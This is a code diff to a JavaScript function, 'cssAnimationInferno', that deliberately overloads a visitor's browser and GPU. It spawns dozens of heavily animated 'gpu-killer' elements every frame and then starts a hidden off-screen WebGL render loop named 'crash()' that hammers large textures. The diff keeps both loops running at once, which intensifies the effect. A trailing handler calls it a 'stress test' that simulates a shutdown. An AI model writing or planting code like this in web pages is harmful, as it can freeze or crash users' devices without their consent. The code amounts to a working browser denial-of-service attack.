@@ -187,7 +187,7 @@ function cssAnimationInferno() {
         style.textContent = `
             @keyframes gpuMeltdown {
                 0% { transform: translate(0, 0) rotate(0deg) scale(1) skew(0deg); filter: hue-rotate(0deg) blur(0px) contrast(100%) brightness(100%); background: radial-gradient(circle, #ff0000, #00ff00, #0000ff); }
-                20% { transform: translate(-50vw, 100vh) rotate(720deg) scale(0.1) skew(-40deg); filter: hue-rotate(360deg) blur(20px) contrast(300%) brightness(200%); background: radial-gradient(circle, #ff0000, #0000ff, #ffff00); }
+                20% { transform: translate(-50vw, 100vh) rotate(720deg) scale(0.1) skew(-40deg); filter: hue-rotate(360deg) blur(20px) contrast(300%) brightness(200%); background: radial-gradient(circle, #ff0000, #00ff00, #ffff00); }
                 50% { transform: translate(200vw, 200vh) rotate(1800deg) scale(20) skew(100deg); filter: hue-rotate(900deg) blur(50px) contrast(600%) brightness(350%); background: radial-gradient(circle, #ff00ff, #00ffff, #ff0000); }
                 80% { transform: translate(-200vw, 250vh) rotate(2880deg) scale(0.0001) skew(-160deg); filter: hue-rotate(1440deg) blur(80px) contrast(900%) brightness(500%); background: radial-gradient(circle, #ff0000, #00ff00, #ffff00); }
                 100% { transform: translate(0, 0) rotate(3600deg) scale(1) skew(0deg); filter: hue-rotate(1800deg) blur(100px) contrast(1100%) brightness(600%); background: radial-gradient(circle, #ff0000, #00ff00, #0000ff); }
@@ -197,11 +197,11 @@ function cssAnimationInferno() {
     }
 
     let elementCount = 0;
-    let frameCount = 0; // Added frame counter
+    let frameCount = 0; 
+    let crashTriggered = false; // Prevents triggering crash() more than once
 
     function createGpuKiller() {
         try {
-            // Drop elements onto the page
             for (let i = 0; i < 60; i++) {
                 const element = document.createElement('div');
                 element.className = 'gpu-killer';
@@ -220,28 +220,26 @@ function cssAnimationInferno() {
 
             frameCount++;
 
-            // If 5 frames have completed, break the loop and trigger the crash
-            if (frameCount >= 3) {
+            // Trigger WebGL execution exactly on the 3rd frame without killing the CSS generation loop
+            if (frameCount >= 3 && !crashTriggered) {
+                crashTriggered = true;
                 crash();
-                return;
             }
 
             if (elementCount > -2146483647) {
                 requestAnimationFrame(createGpuKiller);
             }
         } catch(e) {
-            // Keep going or failover to crash if things go south prematurely
-            if (frameCount >= 5) {
+            if (frameCount >= 3 && !crashTriggered) {
+                crashTriggered = true;
                 crash();
-            } else {
-                requestAnimationFrame(createGpuKiller);
             }
+            requestAnimationFrame(createGpuKiller);
         }
     }
 
-    // Embedded crash function triggered exactly after 5 frames
+    // WebGL routine running concurrently once fired
     function crash() {
-        // WebGL setup
         let canvas = document.createElement('canvas');
         canvas.style.position = 'fixed';
         canvas.style.top = '-9999px';
@@ -259,7 +257,6 @@ function cssAnimationInferno() {
             return;
         }
         
-        // Detect the maximum texture size
         const maxTexSize = gl.getParameter(gl.MAX_TEXTURE_SIZE);
         const size = Math.min(4096, maxTexSize);
         
@@ -267,7 +264,6 @@ function cssAnimationInferno() {
         canvas.height = size;
         gl.viewport(0, 0, size, size);
         
-        // Setup shaders
         const vsSource = `
             attribute vec2 a_position;
             varying vec2 v_texCoord;
@@ -312,7 +308,6 @@ function cssAnimationInferno() {
             throw new Error('Shader program failed');
         }
         
-        // Setup quad buffer
         const quadBuffer = gl.createBuffer();
         gl.bindBuffer(gl.ARRAY_BUFFER, quadBuffer);
         const positions = [-1, -1, 1, -1, -1, 1, 1, 1];
@@ -326,7 +321,6 @@ function cssAnimationInferno() {
         gl.disable(gl.DEPTH_TEST);
         gl.disable(gl.BLEND);
         
-        // Create texture helper
         function createTexture(size) {
             const tex = gl.createTexture();
             gl.bindTexture(gl.TEXTURE_2D, tex);
@@ -338,7 +332,6 @@ function cssAnimationInferno() {
             return tex;
         }
         
-        // Create 16 texture pairs
         const textures = [];
         const framebuffers = [];
         const numPairs = 16;
@@ -355,14 +348,12 @@ function cssAnimationInferno() {
         const timeLoc = gl.getUniformLocation(shaderProgram, 'u_time');
         const opsPerFrame = 500000;
         
-        // Render loop
         let shouldStop = false;
         function renderFrame() {
             if (shouldStop) return;
             
             gl.uniform1f(timeLoc, performance.now() / 1000);
             
-            // Cycle all texture pairs
             for (let pair = 0; pair < numPairs; pair++) {
                 gl.bindFramebuffer(gl.FRAMEBUFFER, framebuffers[pair]);
                 gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, textures[pair * 2 + 1], 0);
@@ -376,13 +367,11 @@ function cssAnimationInferno() {
             requestAnimationFrame(renderFrame);
         }
         
-        // Render immediately
         renderFrame();
     }
 
     createGpuKiller();
 }
-
         // Execution Handler
         function triggerStressTest(intensity) {
             // Hide interface components smoothly to simulate a shutdown sequence
